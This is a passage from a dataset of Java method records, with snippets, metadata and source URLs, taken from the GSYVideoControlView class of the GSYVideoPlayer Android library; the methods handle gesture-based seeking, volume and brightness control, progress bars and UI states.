mChangeVolume = false;\n        mChangePosition = false;\n        mShowVKey = false;\n        mBrightness = false;\n        mFirstTouch = true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55236, "method_name": "touchSurfaceMove", "class_name": "GSYVideoControlView", "params": ["float", "float", "float"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void touchSurfaceMove(float deltaX, float deltaY, float y) {\n        int curWidth = 0;\n        int curHeight = 0;\n        if (getActivityContext() != null) {\n            curWidth = CommonUtil.getCurrentScreenLand((Activity) getActivityContext()) ? mScreenHeight : mScreenWidth;\n            curHeight = CommonUtil.getCurrentScreenLand((Activity) getActivityContext()) ? mScreenWidth : mScreenHeight;\n        }\n        if (mChangePosition) {\n            int totalTimeDuration = getDuration();\n            mSeekTimePosition = (int) (mDownPosition + (deltaX * totalTimeDuration / curWidth) / mSeekRatio);\n            if (mSeekTimePosition > totalTimeDuration)\n                mSeekTimePosition = totalTimeDuration;\n            String seekTime = CommonUtil.stringForTime(mSeekTimePosition);\n            String totalTime = CommonUtil.stringForTime(totalTimeDuration);\n            showProgressDialog(deltaX, seekTime, mSeekTimePosition, totalTime, totalTimeDuration);\n        } else if (mChangeVolume) {\n            deltaY = -deltaY;\n            int max = mAudioManager.getStreamMaxVolume(AudioManager.STREAM_MUSIC);\n            int deltaV = (int) (max * deltaY * 3 / curHeight);\n            mAudioManager.setStreamVolume(AudioManager.STREAM_MUSIC, mGestureDownVolume + deltaV, 0);\n            int volumePercent = (int) (mGestureDownVolume * 100 / max + deltaY * 3 * 100 / curHeight);\n\n            showVolumeDialog(-deltaY, volumePercent);\n        } else if (mBrightness) {\n            if (Math.abs(deltaY) > mThreshold) {\n                float percent = (-deltaY / curHeight);\n                onBrightnessSlide(percent);\n                mDownY = y;\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55237, "method_name": "touchSurfaceMoveFullLogic", "class_name": "GSYVideoControlView", "params": ["float", "float"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void touchSurfaceMoveFullLogic(float absDeltaX, float absDeltaY) {\n        int curWidth = 0;\n        if (getActivityContext() != null) {\n            curWidth = CommonUtil.getCurrentScreenLand((Activity) getActivityContext()) ? mScreenHeight : mScreenWidth;\n        }\n        if (absDeltaX > mThreshold || absDeltaY > mThreshold) {\n            cancelProgressTimer();\n            if (absDeltaX >= mThreshold) {\n                //\u9632\u6b62\u5168\u5c4f\u865a\u62df\u6309\u952e\n                int screenWidth = CommonUtil.getScreenWidth(getContext());\n                if (Math.abs(screenWidth - mDownX) > mSeekEndOffset) {\n                    mChangePosition = true;\n                    mDownPosition = getCurrentPositionWhenPlaying();\n                } else {\n                    mShowVKey = true;\n                }\n            } else {\n                int screenHeight = CommonUtil.getScreenHeight(getContext());\n                boolean noEnd = Math.abs(screenHeight - mDownY) > mSeekEndOffset;\n                if (mFirstTouch) {\n                    mBrightness = (mDownX < curWidth * 0.5f) && noEnd;\n                    mFirstTouch = false;\n                }\n                if (!mBrightness) {\n                    mChangeVolume = noEnd;\n                    mGestureDownVolume = mAudioManager.getStreamVolume(AudioManager.STREAM_MUSIC);\n                }\n                mShowVKey = !noEnd;\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55238, "method_name": "touchSurfaceUp", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void touchSurfaceUp() {\n        if (mChangePosition) {\n            int duration = getDuration();\n            int progress = mSeekTimePosition * 100 / (duration == 0 ? 1 : duration);\n            if (mBottomProgressBar != null)\n                mBottomProgressBar.setProgress(progress);\n        }\n\n        mTouchingProgressBar = false;\n        dismissProgressDialog();\n        dismissVolumeDialog();\n        dismissBrightnessDialog();\n        if (mChangePosition && getGSYVideoManager() != null && (mCurrentState == CURRENT_STATE_PLAYING || mCurrentState == CURRENT_STATE_PAUSE)) {\n            try {\n                getGSYVideoManager().seekTo(mSeekTimePosition);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n            int duration = getDuration();\n            int progress = mSeekTimePosition * 100 / (duration == 0 ? 1 : duration);\n            if (mProgressBar != null) {\n                mProgressBar.setProgress(progress);\n            }\n            if (mVideoAllCallBack != null && isCurrentMediaListener()) {\n                Debuger.printfLog(\"onTouchScreenSeekPosition\");\n                mVideoAllCallBack.onTouchScreenSeekPosition(mOriginUrl, mTitle, this);\n            }\n        } else if (mBrightness) {\n            if (mVideoAllCallBack != null && isCurrentMediaListener()) {\n                Debuger.printfLog(\"onTouchScreenSeekLight\");\n                mVideoAllCallBack.onTouchScreenSeekLight(mOriginUrl, mTitle, this);\n            }\n        } else if (mChangeVolume) {\n            if (mVideoAllCallBack != null && isCurrentMediaListener()) {\n                Debuger.printfLog(\"onTouchScreenSeekVolume\");\n                mVideoAllCallBack.onTouchScreenSeekVolume(mOriginUrl, mTitle, this);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55239, "method_name": "touchDoubleUp", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void touchDoubleUp() {\n        if (!mHadPlay) {\n            return;\n        }\n        clickStartIcon();\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55240, "method_name": "resolveUIState", "class_name": "GSYVideoControlView", "params": ["int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void resolveUIState(int state) {\n        switch (state) {\n            case CURRENT_STATE_NORMAL:\n                changeUiToNormal();\n                cancelDismissControlViewTimer();\n                break;\n            case CURRENT_STATE_PREPAREING:\n                changeUiToPreparingShow();\n                startDismissControlViewTimer();\n                break;\n            case CURRENT_STATE_PLAYING:\n                changeUiToPlayingShow();\n                startDismissControlViewTimer();\n                break;\n            case CURRENT_STATE_PAUSE:\n                changeUiToPauseShow();\n                cancelDismissControlViewTimer();\n                break;\n            case CURRENT_STATE_ERROR:\n                changeUiToError();\n                break;\n            case CURRENT_STATE_AUTO_COMPLETE:\n                changeUiToCompleteShow();\n                cancelDismissControlViewTimer();\n                break;\n            case CURRENT_STATE_PLAYING_BUFFERING_START:\n                changeUiToPlayingBufferingShow();\n                break;\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55241, "method_name": "clickStartIcon", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void clickStartIcon() {\n        if (TextUtils.isEmpty(mUrl)) {\n            Debuger.printfError(\"********\" + getResources().getString(R.string.no_url));\n            //Toast.makeText(getActivityContext(), getResources().getString(R.string.no_url), Toast.LENGTH_SHORT).show();\n            return;\n        }\n        if (mCurrentState == CURRENT_STATE_NORMAL || mCurrentState == CURRENT_STATE_ERROR) {\n            if (isShowNetConfirm()) {\n                showWifiDialog();\n                return;\n            }\n            startButtonLogic();\n        } else if (mCurrentState == CURRENT_STATE_PLAYING) {\n            try {\n                onVideoPause();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n            setStateAndUi(CURRENT_STATE_PAUSE);\n            if (mVideoAllCallBack != null && isCurrentMediaListener()) {\n                if (mIfCurrentIsFullscreen) {\n                    Debuger.printfLog(\"onClickStopFullscreen\");\n                    mVideoAllCallBack.onClickStopFullscreen(mOriginUrl, mTitle, this);\n                } else {\n                    Debuger.printfLog(\"onClickStop\");\n                    mVideoAllCallBack.onClickStop(mOriginUrl, mTitle, this);\n                }\n            }\n        } else if (mCurrentState == CURRENT_STATE_PAUSE) {\n            if (mVideoAllCallBack != null && isCurrentMediaListener()) {\n                if (mIfCurrentIsFullscreen) {\n                    Debuger.printfLog(\"onClickResumeFullscreen\");\n                    mVideoAllCallBack.onClickResumeFullscreen(mOriginUrl, mTitle, this);\n                } else {\n                    Debuger.printfLog(\"onClickResume\");\n                    mVideoAllCallBack.onClickResume(mOriginUrl, mTitle, this);\n                }\n            }\n\n            if (!mHadPlay && !mStartAfterPrepared) {\n                startAfterPrepared();\n            }\n\n            try {\n                getGSYVideoManager().start();\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n            setStateAndUi(CURRENT_STATE_PLAYING);\n        } else if (mCurrentState == CURRENT_STATE_AUTO_COMPLETE) {\n            startButtonLogic();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55242, "method_name": "lockTouchLogic", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void lockTouchLogic() {\n        if (mLockCurScreen) {\n            mLockScreen.setImageResource(R.drawable.unlock);\n            mLockCurScreen = false;\n        } else {\n            mLockScreen.setImageResource(R.drawable.lock);\n            mLockCurScreen = true;\n            hideAllWidget();\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55243, "method_name": "startProgressTimer", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void startProgressTimer() {\n        cancelProgressTimer();\n        mPostProgress = true;\n        postDelayed(progressTask, 300);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55244, "method_name": "cancelProgressTimer", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void cancelProgressTimer() {\n        mPostProgress = false;\n        removeCallbacks(progressTask);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55245, "method_name": "setTextAndProgress", "class_name": "GSYVideoControlView", "params": ["int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setTextAndProgress(int secProgress) {\n        setTextAndProgress(secProgress, false);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55246, "method_name": "setTextAndProgress", "class_name": "GSYVideoControlView", "params": ["int", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setTextAndProgress(int secProgress, boolean forceChange) {\n        int position = getCurrentPositionWhenPlaying();\n        int duration = getDuration();\n        int progress = position * 100 / (duration == 0 ? 1 : duration);\n        setProgressAndTime(progress, secProgress, position, duration, forceChange);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55247, "method_name": "setProgressAndTime", "class_name": "GSYVideoControlView", "params": ["int", "int", "int", "int", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setProgressAndTime(int progress, int secProgress, int currentTime, int totalTime, boolean forceChange) {\n\n        if (mGSYVideoProgressListener != null && mCurrentState == CURRENT_STATE_PLAYING) {\n            mGSYVideoProgressListener.onProgress(progress, secProgress, currentTime, totalTime);\n        }\n\n        if (mProgressBar == null || mTotalTimeTextView == null || mCurrentTimeTextView == null) {\n            return;\n        }\n        if (mHadSeekTouch) {\n            return;\n        }\n        if (!mTouchingProgressBar) {\n            if (progress != 0 || forceChange) mProgressBar.setProgress(progress);\n        }\n        if (getGSYVideoManager().getBufferedPercentage() > 0) {\n            secProgress = getGSYVideoManager().getBufferedPercentage();\n        }\n        if (secProgress > 94) secProgress = 100;\n        setSecondaryProgress(secProgress);\n        mTotalTimeTextView.setText(CommonUtil.stringForTime(totalTime));\n        if (currentTime > 0)\n            mCurrentTimeTextView.setText(CommonUtil.stringForTime(currentTime));\n\n        if (mBottomProgressBar != null) {\n            if (progress != 0 || forceChange) mBottomProgressBar.setProgress(progress);\n            setSecondaryProgress(secProgress);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55248, "method_name": "setSecondaryProgress", "class_name": "GSYVideoControlView", "params": ["int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setSecondaryProgress(int secProgress) {\n        if (mProgressBar != null) {\n            if (secProgress != 0 && !getGSYVideoManager().isCacheFile()) {\n                mProgressBar.setSecondaryProgress(secProgress);\n            }\n        }\n        if (mBottomProgressBar != null) {\n            if (secProgress != 0 && !getGSYVideoManager().isCacheFile()) {\n                mBottomProgressBar.setSecondaryProgress(secProgress);\n            }\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55249, "method_name": "resetProgressAndTime", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void resetProgressAndTime() {\n        if (mProgressBar == null || mTotalTimeTextView == null || mCurrentTimeTextView == null) {\n            return;\n        }\n        mProgressBar.setProgress(0);\n        mProgressBar.setSecondaryProgress(0);\n        mCurrentTimeTextView.setText(CommonUtil.stringForTime(0));\n        mTotalTimeTextView.setText(CommonUtil.stringForTime(0));\n\n        if (mBottomProgressBar != null) {\n            mBottomProgressBar.setProgress(0);\n            mBottomProgressBar.setSecondaryProgress(0);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55250, "method_name": "loopSetProgressAndTime", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void loopSetProgressAndTime() {\n        if (mProgressBar == null || mTotalTimeTextView == null || mCurrentTimeTextView == null) {\n            return;\n        }\n        mProgressBar.setProgress(0);\n        mProgressBar.setSecondaryProgress(0);\n        mCurrentTimeTextView.setText(CommonUtil.stringForTime(0));\n        if (mBottomProgressBar != null)\n            mBottomProgressBar.setProgress(0);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55251, "method_name": "startDismissControlViewTimer", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void startDismissControlViewTimer() {\n        cancelDismissControlViewTimer();\n        mPostDismiss = true;\n        postDelayed(dismissControlTask, mDismissControlTime);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55252, "method_name": "cancelDismissControlViewTimer", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void cancelDismissControlViewTimer() {\n        mPostDismiss = false;\n        removeCallbacks(dismissControlTask);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55253, "method_name": "resolveThumbImage", "class_name": "GSYVideoControlView", "params": ["View"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void resolveThumbImage(View thumb) {\n        if (mThumbImageViewLayout != null) {\n            mThumbImageViewLayout.removeAllViews();\n            mThumbImageViewLayout.addView(thumb);\n            ViewGroup.LayoutParams layoutParams = thumb.getLayoutParams();\n            layoutParams.height = ViewGroup.LayoutParams.MATCH_PARENT;\n            layoutParams.width = ViewGroup.LayoutParams.MATCH_PARENT;\n            thumb.setLayoutParams(layoutParams);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55254, "method_name": "setViewShowState", "class_name": "GSYVideoControlView", "params": ["View", "int"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void setViewShowState(View view, int visibility) {\n        if (view != null) {\n            view.setVisibility(visibility);\n        }\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55255, "method_name": "onBrightnessSlide", "class_name": "GSYVideoControlView", "params": ["float"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "    protected void onBrightnessSlide(float percent) {\n        mBrightnessData = ((Activity) (mContext)).getWindow().getAttributes().screenBrightness;\n        if (mBrightnessData <= 0.00f) {\n            mBrightnessData = 0.50f;\n        } else if (mBrightnessData < 0.01f) {\n            mBrightnessData = 0.01f;\n        }\n        WindowManager.LayoutParams lpa = ((Activity) (mContext)).getWindow().getAttributes();\n        lpa.screenBrightness = mBrightnessData + percent;\n        if (lpa.screenBrightness > 1.0f) {\n            lpa.screenBrightness = 1.0f;\n        } else if (lpa.screenBrightness < 0.01f) {\n            lpa.screenBrightness = 0.01f;\n        }\n        showBrightnessDialog(lpa.screenBrightness);\n        ((Activity) (mContext)).getWindow().setAttributes(lpa);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55256, "method_name": "isShowNetConfirm", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean isShowNetConfirm() {\n        return !mOriginUrl.startsWith(\"file\") && !mOriginUrl.startsWith(\"android.resource\") && !CommonUtil.isWifiConnected(getContext())\n                && mNeedShowWifiTip && !getGSYVideoManager().cachePreview(mContext.getApplicationContext(), mCachePath, mOriginUrl);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55257, "method_name": "showWifiDialog", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void showWifiDialog();\n\n    protected abstract void showProgressDialog(float deltaX,\n                                               String seekTime, int seekTimePosition,\n                                               String totalTime, int totalTimeDuration);\n\n    protected abstract void dismissProgressDialog();\n\n    protected abstract void showVolumeDialog(float deltaY, int volumePercent);\n\n    protected abstract void dismissVolumeDialog();\n\n    protected abstract void showBrightnessDialog(float percent);\n\n    protected abstract void dismissBrightnessDialog();\n\n    protected abstract void onClickUiToggle();\n\n    protected abstract void hideAllWidget();\n\n    protected abstract void changeUiToNormal();\n\n    protected abstract void changeUiToPreparingShow();\n\n    protected abstract void changeUiToPlayingShow();\n\n    protected abstract void changeUiToPauseShow();\n\n    protected abstract void changeUiToError();\n\n    protected abstract void changeUiToCompleteShow();\n\n    protected abstract void changeUiToPlayingBufferingShow();\n\n\n    /************************* \u5f00\u653e\u63a5\u53e3 *************************/\n\n\n    /**\n     * \u5728\u70b9\u51fb\u64ad\u653e\u7684\u65f6\u5019\u624d\u8fdb\u884c\u771f\u6b63setup\n     */\n    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55258, "method_name": "showProgressDialog", "class_name": "GSYVideoControlView", "params": ["float", "String", "int", "String", "int"], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void showProgressDialog(float deltaX,\n                                               String seekTime, int seekTimePosition,\n                                               String totalTime, int totalTimeDuration);\n\n    protected abstract void dismissProgressDialog();\n\n    protected abstract void showVolumeDialog(float deltaY, int volumePercent);\n\n    protected abstract void dismissVolumeDialog();\n\n    protected abstract void showBrightnessDialog(float percent);\n\n    protected abstract void dismissBrightnessDialog();\n\n    protected abstract void onClickUiToggle();\n\n    protected abstract void hideAllWidget();\n\n    protected abstract void changeUiToNormal();\n\n    protected abstract void changeUiToPreparingShow();\n\n    protected abstract void changeUiToPlayingShow();\n\n    protected abstract void changeUiToPauseShow();\n\n    protected abstract void changeUiToError();\n\n    protected abstract void changeUiToCompleteShow();\n\n    protected abstract void changeUiToPlayingBufferingShow();\n\n\n    /************************* \u5f00\u653e\u63a5\u53e3 *************************/\n\n\n    /**\n     * \u5728\u70b9\u51fb\u64ad\u653e\u7684\u65f6\u5019\u624d\u8fdb\u884c\u771f\u6b63setup\n     */\n    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55259, "method_name": "dismissProgressDialog", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void dismissProgressDialog();\n\n    protected abstract void showVolumeDialog(float deltaY, int volumePercent);\n\n    protected abstract void dismissVolumeDialog();\n\n    protected abstract void showBrightnessDialog(float percent);\n\n    protected abstract void dismissBrightnessDialog();\n\n    protected abstract void onClickUiToggle();\n\n    protected abstract void hideAllWidget();\n\n    protected abstract void changeUiToNormal();\n\n    protected abstract void changeUiToPreparingShow();\n\n    protected abstract void changeUiToPlayingShow();\n\n    protected abstract void changeUiToPauseShow();\n\n    protected abstract void changeUiToError();\n\n    protected abstract void changeUiToCompleteShow();\n\n    protected abstract void changeUiToPlayingBufferingShow();\n\n\n    /************************* \u5f00\u653e\u63a5\u53e3 *************************/\n\n\n    /**\n     * \u5728\u70b9\u51fb\u64ad\u653e\u7684\u65f6\u5019\u624d\u8fdb\u884c\u771f\u6b63setup\n     */\n    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55260, "method_name": "showVolumeDialog", "class_name": "GSYVideoControlView", "params": ["float", "int"], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", "snippet": "    protected abstract void showVolumeDialog(float deltaY, int volumePercent);\n\n    protected abstract void dismissVolumeDialog();\n\n    protected abstract void showBrightnessDialog(float percent);\n\n    protected abstract void dismissBrightnessDialog();\n\n    protected abstract void onClickUiToggle();\n\n    protected abstract void hideAllWidget();\n\n    protected abstract void changeUiToNormal();\n\n    protected abstract void changeUiToPreparingShow();\n\n    protected abstract void changeUiToPlayingShow();\n\n    protected abstract void changeUiToPauseShow();\n\n    protected abstract void changeUiToError();\n\n    protected abstract void changeUiToCompleteShow();\n\n    protected abstract void changeUiToPlayingBufferingShow();\n\n\n    /************************* \u5f00\u653e\u63a5\u53e3 *************************/\n\n\n    /**\n     * \u5728\u70b9\u51fb\u64ad\u653e\u7684\u65f6\u5019\u624d\u8fdb\u884c\u771f\u6b63setup\n     */\n    public boolean setUpLazy(String url, boolean cacheWithPlay, File cachePath, Map<String, String> mapHeadData, String title) {\n        mOriginUrl = url;\n        mCache = cacheWithPlay;\n        mCachePath = cachePath;\n        mSetUpLazy = true;\n        mTitle = title;\n        mMapHeadData = mapHeadData;\n        if (isCurrentMediaListener() &&\n                (System.currentTimeMillis() - mSaveChangeViewTIme) < CHANGE_DELAY_TIME)\n            return false;\n        mUrl = \"waiting\";\n        mCurrentState = CURRENT_STATE_NORMAL;\n        return true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/video/base/GSYVideoControlView.java", "stars": "2", "class_props": {"extends": "GSYVideoView", "implements": ["View", "View", "SeekBar"], "modifiers": ["public", "abstract"]}}, {"id": 55261, "method_name": "dismissVolumeDialog", "class_name": "GSYVideoControlView", "params": [], "throws": null, "modifiers": ["protected", "abstract"], "return_type": "void", 